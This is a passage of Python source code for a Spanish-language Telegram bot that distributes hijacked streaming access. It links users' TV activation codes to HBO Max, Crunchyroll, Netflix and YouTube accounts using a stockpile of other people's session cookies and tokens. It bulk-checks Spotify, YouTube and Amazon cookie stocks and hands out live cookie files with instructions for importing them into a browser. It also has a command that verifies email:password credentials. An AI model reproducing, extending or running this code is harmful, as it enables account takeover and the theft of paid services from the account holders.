    elif len(text) == 8 and text.isdigit():
        context.user_data['last_activation'] = 'NETFLIX TV'
        # Activación automática de Netflix si se envía solo el código de 8 dígitos
        context.args = [text]
        asyncio.create_task(nfx.tv_command(update, context))

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # --- FILTRO DE SEGURIDAD PARA GRUPOS ---
    # El bot ignorará fotos enviadas en grupos para evitar spam. Solo trabaja en privado.
    if update.effective_chat.type != 'private': return

    user_id = update.effective_user.id
    if not await check_membership(context.bot, user_id): return
    
    # --- ESCÁNER DE VISIÓN ARTIFICIAL (QR LINKER) ---
    photo_file = await update.message.photo[-1].get_file()
    temp_img = f"temp_qr_{user_id}.jpg"
    await photo_file.download_to_drive(temp_img)
    
    qr_data, status = qr_vision.scan_qr_from_image(temp_img)
    
    if status == "SUCCESS":
        # Extraer código si es una URL (HBO, Disney, Crunchy suelen usar URLs en el QR)
        code = qr_data
        if "code=" in qr_data:
            code = qr_data.split("code=")[-1][:8].upper()
        elif "/" in qr_data:
            code = qr_data.split("/")[-1][:8].upper()
            
        mode = context.user_data.get('mode')
        if mode == 'hbo':
            await update.message.reply_html(f"<code>[✔] QR DETECTADO (HBO MAX)\n[>] CÓDIGO: {code}</code>")
            asyncio.create_task(fast_hbo_activation(update, context, code[:6]))
            if os.path.exists(temp_img): os.remove(temp_img)
            return
        elif mode == 'crunchy' or "crunchyroll.com" in qr_data.lower():
            # Crunchyroll suele usar códigos de 6 caracteres alfanuméricos
            cr_match = re.search(r'([A-Z0-9]{6})', code.upper())
            cr_code = cr_match.group(1) if cr_match else code[:6].upper()
            
            await update.message.reply_html(f"<code>[✔] QR DETECTADO (CRUNCHYROLL)\n[>] CÓDIGO: {cr_code}</code>")
            asyncio.create_task(fast_crunchy_activation(update, context, cr_code))
            if os.path.exists(temp_img): os.remove(temp_img)
            return
        elif mode == 'netflix' or "netflix.com" in qr_data.lower():
            # Extracción quirúrgica para Netflix (busca 8 dígitos seguidos en cualquier parte de la URL)
            nf_match = re.search(r'(\d{8})', qr_data)
            if nf_match:
                nf_code = nf_match.group(1)
            else:
                # Si no hay 8 seguidos, limpiamos todo y tomamos los últimos 8
                nf_code = re.sub(r'\D', '', qr_data)[-8:]
            
            if len(nf_code) == 8:
                await update.message.reply_html(f"<code>[✔] QR DETECTADO (NETFLIX)\n[>] CÓDIGO: {nf_code}</code>")
                context.args = [nf_code]
                asyncio.create_task(nfx.tv_command(update, context))
            else:
                await update.message.reply_html(f"<code>[✖] ERROR DE LECTURA\n[>] No se pudo extraer un código de 8 dígitos del QR.</code>")
            
            if os.path.exists(temp_img): os.remove(temp_img)
            return
        else:
            await update.message.reply_html(f"<code>[!] QR DETECTADO: {code}\n[!] Selecciona una plataforma primero para activar.</code>")
            if os.path.exists(temp_img): os.remove(temp_img)
            return

    # Si no hay QR, tratamos como Referencia/Vouch
    if os.path.exists(temp_img): os.remove(temp_img)
    
    last_act = context.user_data.get('last_activation')
    if last_act:
        username = update.effective_user.username or update.effective_user.first_name
        photo_id = update.message.photo[-1].file_id
        asyncio.create_task(post_hit(context, username, last_act, photo=photo_id))
        await update.message.reply_html(f"<code>[✔] REFERENCIA RECIBIDA.\n[>] Tu éxito ha sido publicado en {HITS_CHANNEL}.</code>{FOOTER}")
        context.user_data['last_activation'] = None

async def fast_hbo_activation(update, context, code):
    status_msg = await update.message.reply_html(f"<code>[+] INJECTING HBO: {code}...</code>")
    hbo_files = glob.glob(os.path.join(hbo.COOKIES_FOLDER, "*.txt")) + glob.glob(os.path.join(hbo.COOKIES_FOLDER, "*.json"))
    random.shuffle(hbo_files)
    if not hbo_files: return
    for chosen_file in hbo_files[:5]:
        try:
            with open(chosen_file, 'r', encoding='utf-8', errors='ignore') as f: content = f.read()
            st_token = hbo.extract_st_token(content)
            if not st_token: continue
            region = hbo.get_region_from_jwt(st_token)
            success, status = await dispatch_mission(hbo.activate_tv_code, st_token, code, region)
            if success:
                await status_msg.edit_text(f"<code>\n [✔] ACCESS GRANTED\n [>] CODE: {code}\n [>] REGION: {region.upper()}\n [>] OWNER: {OWNER_HANDLE}</code>{FOOTER}", parse_mode='HTML')
                username = update.effective_user.username or update.effective_user.first_name
                context.user_data['last_activation'] = 'HBO MAX TV'
                asyncio.create_task(post_hit(context, username, "HBO MAX TV"))
                increment_user_hits(update.effective_user)
                return
        except: continue

async def fast_crunchy_activation(update, context, code):
    status_msg = await update.message.reply_html(f"<code>[+] INITIATING CRUNCHY BYPASS: {code}...</code>")
    
    # --- MÉTODO 1: COOKIES (EXISTENTE) ---
    cookiescr_files = glob.glob(os.path.join("cookiescr", "*.txt"))
    if cookiescr_files:
        random.shuffle(cookiescr_files)
        for cookie_file in cookiescr_files[:5]:
            try:
                cookies = await dispatch_mission(crunchy.parse_cookie_file, cookie_file)
                def crunchy_logic(cookies, code):
                    token_headers = {"User-Agent": crunchy.get_user_agent(), "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"}
                    token_res = crunchy.make_request("POST", "https://www.crunchyroll.com/auth/v1/token", headers=token_headers, data=f"device_id={crunchy.generate_uuid()}&device_type=Chrome%20on%20Android&grant_type=etp_rt_cookie", cookies=cookies)
                    access_token = crunchy.parse_between(token_res["SOURCE"], '"access_token":"', '"')
                    act_res = crunchy.make_request("POST", "https://www.crunchyroll.com/auth/v1/device", headers={"Authorization": f"Bearer {access_token}"}, json_data={"user_code": code}, cookies=cookies)
                    return act_res["RESPONSECODE"] == "200"
                
                success = await dispatch_mission(crunchy_logic, cookies, code)
                if success:
                    await status_msg.edit_text(f"<code>\n [✔] LINKED (COOKIE METHOD)\n [>] CODE: {code}\n [>] OWNER: {OWNER_HANDLE}</code>{FOOTER}", parse_mode='HTML')
                    username = update.effective_user.username or update.effective_user.first_name
                    context.user_data['last_activation'] = 'CRUNCHYROLL TV'
                    asyncio.create_task(post_hit(context, username, "CRUNCHYROLL TV"))
                    increment_user_hits(update.effective_user)
                    return
            except: continue

    # --- MÉTODO 2: AUTO-BYPASS ORIGINAL (PLAN B) ---
    await status_msg.edit_text(f"<code>[!] COOKIES FAILED. INJECTING ORIGINAL AUTO-BYPASS...</code>", parse_mode='HTML')
    
    if not os.path.exists("CrunchyrollAutoTV.py"):
        await status_msg.edit_text(f"<code>[-] ERROR: CrunchyrollAutoTV.py not found in server.</code>{FOOTER}", parse_mode='HTML')
        return

    log_file = f"crunchy_log_{code}.txt"
    try:
        # Ejecutamos con -u (unbuffered) y forzamos UTF-8
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        
        process = await asyncio.create_subprocess_exec(
            sys.executable, "-u", "CrunchyrollAutoTV.py",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env
        )
        
        # Enviamos el código y esperamos hasta 2 minutos
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(input=f"{code}\n".encode()), timeout=120)
        except asyncio.TimeoutError:
            process.kill()
            await status_msg.edit_text(f"<code>[-] ERROR: Bypass Timeout (2 min).\n[!] El script tardó demasiado en responder.</code>{FOOTER}", parse_mode='HTML')
            return

        output = stdout.decode(errors='ignore')
        err_output = stderr.decode(errors='ignore')
        
        # Guardar log para diagnóstico profundo
        with open(log_file, "w", encoding="utf-8") as f:
            f.write(f"--- STDOUT ---\n{output}\n\n--- STDERR ---\n{err_output}")

        if "SUCCESSFUL" in output.upper() or "LINKED" in output.upper():
            await status_msg.edit_text(f"<code>\n [✔] LINKED (AUTO-BYPASS ORIGINAL)\n [>] CODE: {code}\n [>] OWNER: {OWNER_HANDLE}</code>{FOOTER}", parse_mode='HTML')
            username = update.effective_user.username or update.effective_user.first_name
            context.user_data['last_activation'] = 'CRUNCHYROLL TV'
            asyncio.create_task(post_hit(context, username, "CRUNCHYROLL TV"))
            increment_user_hits(update.effective_user)
            if os.path.exists(log_file): os.remove(log_file)
            return
        else:
            await status_msg.delete()
            error_msg = f"<code>[-] FAILED: Original Script could not link TV.\n[!] Revisa el archivo adjunto para ver el fallo real.</code>{FOOTER}"
            with open(log_file, "rb") as doc:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=doc,
                    caption=error_msg,
                    parse_mode='HTML'
                )
    except Exception as e:
        await status_msg.edit_text(f"<code>[!] SYSTEM ERROR: {escape_html(str(e))}</code>{FOOTER}", parse_mode='HTML')
    finally:
        if os.path.exists(log_file):
            try: os.remove(log_file)
            except: pass

async def addacc_hbo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    text = " ".join(context.args)
    if ":" not in text: return
    email, password = text.split(":", 1)
    status_msg = await update.message.reply_html(f"<code>[+] INITIATING BROWSER VERIFICATION...\n[+] TARGET: {email}</code>")
    try:
        success, msg = await h_browser.check_hbo_account_browser(email, password)
        if success:
            accounts = cargar_json(HBO_ACC_FILE, [])
            if text not in accounts:
                accounts.append(text)
                guardar_json(HBO_ACC_FILE, accounts)
                await status_msg.edit_text(f"<code>[✔] BROWSER SUCCESS: Account is LIVE.</code>{FOOTER}", parse_mode='HTML')
    except Exception as e: await status_msg.edit_text(f"<code>[!] ERROR: {str(e)}</code>", parse_mode='HTML')

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID: return
    if not update.message.document: return
    
    doc = update.message.document
    mode = context.user_data.get('mode')
    
    if mode == 'admin_extract':
        status_msg = await update.message.reply_html("<code>[+] DOWNLOADING FILE FOR MINING...</code>")
        file = await context.bot.get_file(doc.file_id)
        temp_path = f"extract_{user_id}.txt"
        await file.download_to_drive(temp_path)
        
        with open(temp_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        if os.path.exists(temp_path): os.remove(temp_path)
        asyncio.create_task(handle_admin_extraction(update, context, content))
        return

    if doc.file_name.endswith(".txt") and mode != 'netflix':
        file = await context.bot.get_file(doc.file_id)
        await file.download_to_drive(PROXIES_FILE)
        await update.message.reply_html("<code>[✔] PROXIES INJECTED.</code>")
        return

    # Si estamos en modo Netflix, delegamos al script de Netflix
    if mode == 'netflix' or context.user_data.get('mode') in ['check', 'nftoken', 'clean']:
        try:
            await nfx.file_upload(update, context)
        except AttributeError:
            await update.message.reply_html("<code>[!] ERROR: NetflixBot.file_upload no disponible.</code>")

async def clean_spotify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    [⚡] MÓDULO DE PURGA SPOTIFY TURBO - GOZU EDITION
    Limpia el stock de Spotify en paralelo, inyecta sellos y organiza carpetas.
    """
    if update.effective_user.id != OWNER_ID: return
    
    # --- INICIALIZACIÓN DEL SISTEMA ---
    status_msg = await update.effective_message.reply_html("<code>[+] INICIANDO PROTOCOLO DE PURGA SPOTIFY...\n[+] ESCANEANDO BÓVEDA DE COOKIES...</code>")
    
    lab_dir = "spotify_lab_v10"
    stock_dir = "cookies_spotify"
    script_name = "spotifycookie.py"
    
    # 1. VERIFICACIÓN DE RECURSOS
    if not os.path.exists(stock_dir):
        await safe_edit(status_msg, f"<code>[-] ERROR CRÍTICO: No se encontró la carpeta '{stock_dir}'.</code>")
        return
        
    # Escaneo recursivo para encontrar todas las cookies (Premium/Free/Raíz)
    source_files = glob.glob(os.path.join(stock_dir, "**", "*.txt"), recursive=True)
    if not source_files:
        source_files = glob.glob(os.path.join(stock_dir, "*.txt"))
        
    if not source_files:
        await safe_edit(status_msg, f"<code>[-] ERROR: Bóveda de Spotify vacía. No hay nada que limpiar.</code>")
        return
        
    if not os.path.exists(script_name):
        await safe_edit(status_msg, f"<code>[-] ERROR: No se encontró el motor '{script_name}'.</code>")
        return

    await safe_edit(status_msg, f"<code>[+] STOCK DETECTADO: {len(source_files)} archivos.\n[+] PREPARANDO LABORATORIO DE PRUEBAS...</code>")

    try:
        # 2. PREPARACIÓN DEL LABORATORIO (AISLAMIENTO)
        if os.path.exists(lab_dir): shutil.rmtree(lab_dir)
        os.makedirs(os.path.join(lab_dir, "cookies"), exist_ok=True)
        
        # Copiamos el motor y sus dependencias al laboratorio
        shutil.copy(script_name, lab_dir)
        if os.path.exists("config.yml"): shutil.copy("config.yml", lab_dir)
        if os.path.exists("proxy.txt"): shutil.copy("proxy.txt", lab_dir)
        
        # Copiamos todas las cookies para procesarlas sin riesgo
        for f in source_files:
            shutil.copy(f, os.path.join(lab_dir, "cookies", os.path.basename(f)))
            
        await safe_edit(status_msg, f"<code>[+] LABORATORIO CARGADO: {len(source_files)} cookies.\n[+] ENCENDIENDO MOTOR DE VERIFICACIÓN...</code>")
        
        # 3. CREACIÓN DEL LANZADOR MAESTRO (PARA EVITAR INPUTS BLOQUEANTES)
        # Este script ejecutará el checker en modo automático y guardará los resultados.
        runner_code = """
import spotifycookie
import sys
import os

def run_turbo():
    # Asegurar carpetas base dentro del laboratorio
    spotifycookie.create_base_folders()
    # Cargar configuración original
    config, _ = spotifycookie.load_config()
    # Forzar modo log para evitar bugeos de terminal y habilitar 30 hilos
    if "display" not in config: config["display"] = {}
    config["display"]["mode"] = "log"
    
    print("[+] MOTOR_LAB: Iniciando limpieza turbo...")
    spotifycookie.checkCookies(num_threads=30, config=config)
    print("[+] MOTOR_LAB: Proceso finalizado correctamente.")

if __name__ == "__main__":
    run_turbo()
"""
        with open(os.path.join(lab_dir, "bot_runner.py"), "w", encoding='utf-8') as rf:
            rf.write(runner_code)

        # 4. EJECUCIÓN DEL PROCESO EN PARALELO (SUBPROCESO)
        # Usamos subprocess para evitar que el bot se congele y manejar errores de memoria.
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        
        process = await asyncio.create_subprocess_exec(
            sys.executable, "bot_runner.py",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=lab_dir,
            env=env
        )
        
        await safe_edit(status_msg, f"<code>[+] MOTOR EN MARCHA (MODO TURBO)...\n[!] PROCESANDO {len(source_files)} CUENTAS...\n[>] POR FAVOR, ESPERA...</code>")
        
        # Esperamos a que el motor termine (tiempo límite 10 minutos)
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=600)
            if process.returncode != 0:
                error_log = stderr.decode(errors='ignore').strip()
                print(f"[-] ERROR EN MOTOR SPOTIFY: {error_log}")
                await safe_edit(status_msg, f"<code>[-] EL MOTOR HA COLAPSADO.\n[!] ERROR: {escape_html(error_log[:100])}</code>")
                return
        except asyncio.TimeoutError:
            process.kill()
            await safe_edit(status_msg, "<code>[-] ERROR: Tiempo de espera agotado (10 min).</code>")
            return

        # 5. RECOLECCIÓN Y SELLADO DE HITS
        # Primero limpiamos el stock antiguo para que solo queden las vivas
        for f in source_files:
            if os.path.exists(f): os.remove(f)
            
        vivas, premium, free = 0, 0, 0
        hits_root = os.path.join(lab_dir, "hits")
        
        if os.path.exists(hits_root):
            # Buscamos recursivamente en la carpeta de hits generada por el motor
            for root, dirs, files in os.walk(hits_root):
                for f in files:
                    if f.endswith(".txt"):
                        full_path = os.path.join(root, f)
                        
                        # Leemos la cookie para inyectar el sello oficial
                        with open(full_path, 'r', encoding='utf-8', errors='ignore') as hit_file:
                            cookie_data = hit_file.read()
                        
                        # Creamos el sello oficial del Owner
                        sello_gozu = (
                            "#SPOTIFY COOKIES CHECKER\n"
                            f"#SOFTWARE: SPOTIFY COOKIES CHECKER BY {OWNER_HANDLE}\n"
                            "#VERSION: V2.0.5\n"
                            f"#OWNER: {OWNER_HANDLE}\n\n"
                        )
                        
                        # Clasificamos y movemos al stock principal
                        if "Free" in root:
                            free += 1
                            target_subdir = os.path.join(stock_dir, "Free")
                        else:
                            premium += 1
                            target_subdir = os.path.join(stock_dir, "Premium")
                        
                        os.makedirs(target_subdir, exist_ok=True)
                        with open(os.path.join(target_subdir, f), 'w', encoding='utf-8') as final_file:
                            final_file.write(sello_gozu + cookie_data.strip())
                        
                        vivas += 1
        
        # 6. LIMPIEZA FINAL DEL LABORATORIO
        if os.path.exists(lab_dir): shutil.rmtree(lab_dir)
        
        # Calculamos cuántas murieron
        eliminadas_total = len(source_files) - vivas
            
        reporte_final = (
            "<code>\n"
            " ╔══════════════════════════════════╗\n"
            " ║  ░▒▓█ SPOTIFY PURGE DONE █▓▒░   ║\n"
            " ╚══════════════════════════════════╝\n\n"
            f" [>] Total Escaneadas: {len(source_files)}\n"
            f" [✔] Vivas en Stock: {vivas}\n"
            f" [💎] Premium: {premium}\n"
            f" [🎧] Free: {free}\n"
            f" [❌] Muertas Eliminadas: {eliminadas_total}\n\n"
            " [!] Stock actualizado y sellado.\n"
            "</code>"
        )
        await safe_edit(status_msg, reporte_final + FOOTER)
        
    except Exception as e:
        print(f"[!] ERROR CRÍTICO EN PURGA: {e}")
        error_msg = f"<code>[!] ERROR CRÍTICO EN EL LABORATORIO:\n{escape_html(str(e))}</code>"
        await safe_edit(status_msg, error_msg)
        if os.path.exists(lab_dir): shutil.rmtree(lab_dir)

async def drop_youtube_cookie(update, context):
    query = update.callback_query
    if not await maintenance_guard(query, "youtube"):
        return
    user_id = query.from_user.id
    ahora = time.time()
    if user_id != OWNER_ID:
        last_time = yt_cookie_cooldowns.get(user_id, 0)
        restante = int(YT_COOKIE_COOLDOWN - (ahora - last_time))
        if restante > 0:
            await query.answer(f"⏳ ESPERA {restante}s PARA OTRA COOKIE", show_alert=True)
            return

    status_msg = await query.message.reply_html("<code>[+] SCANNING YOUTUBE VAULT...\n[+] ANALYZING ARSENAL...</code>")
    
    stock_dir = "cookies_youtube"
    if not os.path.exists(stock_dir): os.makedirs(stock_dir)
        
    # Buscar en subcarpetas Premium primero
    premium_files = glob.glob(os.path.join(stock_dir, "Premium", "*.txt"))
    all_files = premium_files if premium_files else glob.glob(os.path.join(stock_dir, "*.txt"))
    
    if not all_files:
        await status_msg.edit_text(f"<code>[-] ERROR: YouTube Vault is empty.</code>{FOOTER}", parse_mode='HTML')
        return
    
    random.shuffle(all_files)
    chosen_file = all_files[0]
    
    try:
        yt_cookie_cooldowns[user_id] = ahora
        new_filename = "YOUTUBE_PREMIUM_COOKIE.txt"

        delivery_msg = (
            "<code>╔══════════════════════════════════╗\n"
            "║  ░▒▓█ YOUTUBE PREMIUM █▓▒░      ║\n"
            "╚══════════════════════════════════╝</code>\n\n"
            f"🛡️ <b>Status:</b> VERIFIED\n"
            f"💎 <b>Plan:</b> Premium\n\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"📁 <b>FILE:</b> {new_filename}\n"
            "📱 <b>MB:</b> Usa Kiwi Browser\n"
            "🖥️ <b>PC:</b> Importa en Cookie-Editor\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"👑 <b>OWNER:</b> {OWNER_HANDLE}\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>"
        )
        
        await status_msg.delete()
        
        with open(chosen_file, "r", encoding='utf-8', errors='ignore') as f:
            cookie_content = f.read()
            
        # Inyectar sello
        seal = (
            "#YOUTUBE COOKIES CHECKER\n"
            f"#SOFTWARE: YOUTUBE COOKIES CHECKER BY {OWNER_HANDLE}\n"
            "#VERSION: V2.0.5\n"
            f"#OWNER: {OWNER_HANDLE}\n\n"
        )
        
        temp_file = f"temp_yt_{user_id}.txt"
        with open(temp_file, "w", encoding='utf-8') as f:
            f.write(seal + cookie_content)

        with open(temp_file, "rb") as doc:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=doc,
                filename=new_filename,
                caption=delivery_msg,
                parse_mode='HTML',
                reply_markup=FEEDBACK_MARKUP
            )
        if os.path.exists(temp_file): os.remove(temp_file)
        
        username = update.effective_user.username or update.effective_user.first_name
        context.user_data['last_activation'] = 'YOUTUBE COOKIE'
        asyncio.create_task(post_hit(context, username, "YOUTUBE PREMIUM DROP"))
        increment_user_hits(update.effective_user)
        await send_vouch_request(update, context, "YOUTUBE COOKIE")
    except Exception as e:
        await query.message.reply_html(f"<code>[-] ERROR AL ENTREGAR: {str(e)}</code>{FOOTER}")

async def clean_youtube(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    status_msg = await update.effective_message.reply_html("<code>[+] INITIATING YOUTUBE PURGE...\n[+] SCANNING VAULT...</code>")
    
    stock_dir = "cookies_youtube"
    if not os.path.exists(stock_dir): os.makedirs(stock_dir)
    
    source_files = glob.glob(os.path.join(stock_dir, "**", "*.txt"), recursive=True)
    if not source_files:
        source_files = glob.glob(os.path.join(stock_dir, "*.txt"))
        
    if not source_files:
        await safe_edit(status_msg, "<code>[-] ERROR: YouTube Vault is empty.</code>")
        return
        
    await safe_edit(status_msg, f"<code>[+] ANALYZING {len(source_files)} COOKIES...\n[⚡] TURBO MODE ENABLED...</code>")
    
    vivas, premium, free, deads = 0, 0, 0, 0
    lock = asyncio.Lock()
    semaphore = asyncio.Semaphore(10)

    async def check_one(f_path):
        nonlocal vivas, premium, free, deads
        async with semaphore:
            try:
                cookie_dict = yt_check.parse_cookie_file(f_path)
                if not cookie_dict:
                    if os.path.exists(f_path): os.remove(f_path)
                    async with lock: deads += 1
                    return
                    
                res = await dispatch_mission(yt_check.check_youtube_cookie, cookie_dict)
                
                async with lock:
                    if res and res.get('ok') and res.get('premium'):
                        vivas += 1
                        premium += 1
                        
                        # Solo guardamos en la carpeta Premium
                        dest_dir = os.path.join(stock_dir, "Premium")
                        os.makedirs(dest_dir, exist_ok=True)
                        
                        # Inyectar sello oficial
                        seal = (
                            "#YOUTUBE COOKIES CHECKER\n"
                            f"#SOFTWARE: YOUTUBE COOKIES CHECKER BY {OWNER_HANDLE}\n"
                            "#VERSION: V2.0.5\n"
                            f"#OWNER: {OWNER_HANDLE}\n\n"
                        )
                        
                        with open(f_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        # Limpiar sellos antiguos
                        clean_content = ""
                        for line in content.splitlines():
                            if not line.startswith("#"): clean_content += line + "\n"
                        
                        new_path = os.path.join(dest_dir, os.path.basename(f_path))
                        if os.path.exists(f_path): os.remove(f_path)
                        with open(new_path, 'w', encoding='utf-8') as f:
                            f.write(seal + clean_content.strip())
                    else:
                        # Si es Free o Muerta, se elimina
                        if os.path.exists(f_path): os.remove(f_path)
                        if res and res.get('ok') and not res.get('premium'):
                            free += 1
                        deads += 1
            except:
                if os.path.exists(f_path): os.remove(f_path)
                async with lock: deads += 1

    tasks = [check_one(f) for f in source_files]
    await asyncio.gather(*tasks)
    
    report = (
        "<code>\n"
        " ╔══════════════════════════════════╗\n"
        " ║  ░▒▓█ YOUTUBE PURGE DONE █▓▒░    ║\n"
        " ╚══════════════════════════════════╝\n\n"
        f" [>] Total Escaneadas: {len(source_files)}\n"
        f" [💎] Premium Guardadas: {premium}\n"
        f" [🎧] Free Descartadas: {free}\n"
        f" [❌] Muertas Eliminadas: {deads - free}\n"
        "</code>"
    )
    await safe_edit(status_msg, report + FOOTER)

async def drop_amazon_cookie(update, context):
    query = update.callback_query
    if not await maintenance_guard(query, "prime"):
        return
    user_id = query.from_user.id
    ahora = time.time()
    if user_id != OWNER_ID:
        last_time = amazon_cookie_cooldowns.get(user_id, 0)
        restante = int(AMAZON_COOKIE_COOLDOWN - (ahora - last_time))
        if restante > 0:
            await query.answer(f"⏳ ESPERA {restante}s PARA OTRA COOKIE", show_alert=True)
            return

    status_msg = await query.message.reply_html("<code>[+] SCANNING AMAZON VAULT...\n[+] ANALYZING ARSENAL...</code>")
    
    if not os.path.exists("cookies_amazon"):
        os.makedirs("cookies_amazon")
        
    cookie_files = glob.glob(os.path.join("cookies_amazon", "*"))
    if not cookie_files:
        await status_msg.edit_text(f"<code>[-] ERROR: Amazon Vault is empty.</code>{FOOTER}", parse_mode='HTML')
        return
    
    random.shuffle(cookie_files)
    intentos = 0
    max_intentos = 5
    
    # Entrega directa para evitar falsos negativos (Stock ya purgado)
    chosen_file = cookie_files[0]
    try:
        amazon_cookie_cooldowns[user_id] = ahora
        original_ext = os.path.splitext(chosen_file)[1] or ".txt"
        new_filename = f"AMAZON_COOKIE{original_ext}"

        delivery_msg = (
            "<code>╔══════════════════════════════════╗\n"
            "║  ░▒▓█ AMAZON PRIME VIDEO █▓▒░   ║\n"
            "╚══════════════════════════════════╝</code>\n\n"
            f"🛡️ <b>Status:</b> VERIFIED\n"
            f"🌍 <b>Region:</b> Mixed\n\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"📁 <b>FILE:</b> {new_filename}\n"
            "📱 <b>MB:</b> Usa Kiwi Browser\n"
            "🖥️ <b>PC:</b> Importa este archivo en Cookie-Editor\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"👑 <b>OWNER:</b> {OWNER_HANDLE}\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>"
        )
        
        await status_msg.delete()
        # Inyectar sello en el archivo antes de enviar
        with open(chosen_file, "r", encoding='utf-8', errors='ignore') as f:
            cookie_content = f.read()
            
        clean_lines = []
        for line in cookie_content.splitlines():
            if line.startswith("#"):
                continue
            clean_lines.append(line)
            
        sealed_content = (
            "#PRIME VIDEO COOKIES CHECKER\n"
            "#SOFTWARE: PRIME VIDEO COOKIES CHECKER BY @Zzzz_0456\n"
            "#VERSION: V2.0.5\n"
            "#OWNER: @Zzzz_0456\n\n"
        ) + "\n".join(clean_lines)
        
        temp_file = f"temp_amazon_{user_id}.txt"
        with open(temp_file, "w", encoding='utf-8') as f:
            f.write(sealed_content)

        with open(temp_file, "rb") as doc:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=doc,
                filename=new_filename,
                caption=delivery_msg,
                parse_mode='HTML',
                reply_markup=FEEDBACK_MARKUP
            )
        if os.path.exists(temp_file): os.remove(temp_file)
        
        username = update.effective_user.username or update.effective_user.first_name
        context.user_data['last_activation'] = 'AMAZON COOKIE'
        asyncio.create_task(post_hit(context, username, "AMAZON COOKIE DROP"))
        increment_user_hits(update.effective_user)
        await send_vouch_request(update, context, "AMAZON COOKIE")
    except Exception as e:
        await status_msg.edit_text(f"<code>[-] ERROR AL ENTREGAR: {str(e)}</code>{FOOTER}", parse_mode='HTML')

async def clean_amazon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    status_msg = await update.effective_message.reply_html("<code>[+] INITIATING AMAZON PURGE...\n[+] SCANNING VAULT...</code>")
    
    cookie_files = glob.glob(os.path.join("cookies_amazon", "*"))
    if not cookie_files:
        await status_msg.edit_text("<code>[-] ERROR: Amazon Vault is empty.</code>", parse_mode='HTML')
        return
        
    total = len(cookie_files)
    results = {"eliminadas": 0, "vivas": 0}
    lock = asyncio.Lock()
    semaphore = asyncio.Semaphore(10) # 10 a la vez

    async def check_one(f_path):
        try:
            async with semaphore:
                with open(f_path, 'r', encoding='utf-8', errors='ignore') as f:
                    original_content = f.read()
                
                cookie_str = p_check.parse_amazon_file(f_path)
                if not cookie_str: return
                    
                info = await dispatch_mission(p_check.check_prime_cookie_advanced, cookie_str)
                
                async with lock:
                    if info and info.get('ok'):
                        seal = (
                            "#PRIME VIDEO COOKIES CHECKER\n"
                            "#SOFTWARE: PRIME VIDEO COOKIES CHECKER BY @Zzzz_0456\n"
                            "#VERSION: V2.0.5\n"
                            "#OWNER: @Zzzz_0456\n\n"
                        )
                        if "@Zzzz_0456" not in original_content:
                            with open(f_path, 'w', encoding='utf-8') as f:
                                f.write(seal + original_content)
                        results["vivas"] += 1
                    else:
                        # Si no es OK, se borra (Purga agresiva solicitada)
                        if os.path.exists(f_path): os.remove(f_path)
                        results["eliminadas"] += 1
        except Exception as e:
            print(f"Error turbo-limpiando {f_path}: {e}")

    tasks = [check_one(f) for f in cookie_files]
    await asyncio.gather(*tasks)
    
    vivas = results["vivas"]
    eliminadas = results["eliminadas"]
            
    report = (
        "<code>\n"
        " ╔══════════════════════════════════╗\n"
        " ║  ░▒▓█ AMAZON PURGE DONE █▓▒░    ║\n"
        " ╚══════════════════════════════════╝\n\n"
        f" [>] Total Escaneadas: {total}\n"
        f" [✔] Vivas en Stock: {vivas}\n"
        f" [❌] Muertas Eliminadas: {eliminadas}\n"
        "</code>"
    )
    res = await safe_edit(status_msg, report + FOOTER)
    if not res: await update.effective_message.reply_html(report + FOOTER)

async def tv_youtube(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != 'private': return
    user_id = update.effective_user.id
    if not await check_membership(context.bot, user_id): return
    
    args = context.args
    if not args:
        await update.message.reply_html("<code>❌ Uso: /tvyoutube 12345678\n[>] Obtén el código de la pantalla de YouTube en tu TV.</code>")
        return
        
    tv_code = re.sub(r'\D', '', args[0])
    status_msg = await update.message.reply_html(f"<code>[+] INITIATING YOUTUBE TV BYPASS...\n[>] CODE: {tv_code}\n[+] SCANNING VAULT...</code>")
    
    # Buscar cookies vivas
    premium_files = glob.glob(os.path.join("cookies_youtube", "Premium", "*.txt"))
    if not premium_files:
        premium_files = glob.glob(os.path.join("cookies_youtube", "*.txt"))
        
    if not premium_files:
        await status_msg.edit_text("<code>[-] ERROR: No hay cookies de YouTube Premium disponibles.</code>", parse_mode='HTML')
        return
        
    random.shuffle(premium_files)
    for f_path in premium_files[:3]: # Probar 3 cookies
        try:
            cookie_dict = yt_check.parse_cookie_file(f_path)
            session = requests.Session()
            session.cookies.update(cookie_dict)
            
            res = await dispatch_mission(yt_check.submit_youtube_tv, session, tv_code)
            if res.get('success'):
                success_msg = (
                    "<code>╔══════════════════════════════════╗\n"
                    "║  ░▒▓█ YOUTUBE TV ACTIVATED █▓▒░  ║\n"
                    "╚══════════════════════════════════╝</code>\n\n"
                    f"📺 <b>CODE:</b> <code>{tv_code}</code>\n"
